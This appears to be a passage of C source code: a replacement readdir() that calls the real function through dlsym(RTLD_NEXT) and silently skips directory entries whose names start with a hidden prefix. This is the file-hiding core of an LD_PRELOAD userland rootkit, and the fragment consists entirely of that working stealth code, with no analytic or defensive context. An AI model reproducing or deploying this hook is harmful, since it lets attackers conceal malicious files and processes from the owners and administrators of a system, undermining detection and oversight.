    static readdir_t _readdir;
    if (_readdir == NULL)
        _readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");

    struct dirent * result = NULL;
    do {
        result = _readdir(dir);
    } while (result && !strncmp(result->d_name, INVISIBLE, strlen(INVISIBLE)));

    return result;
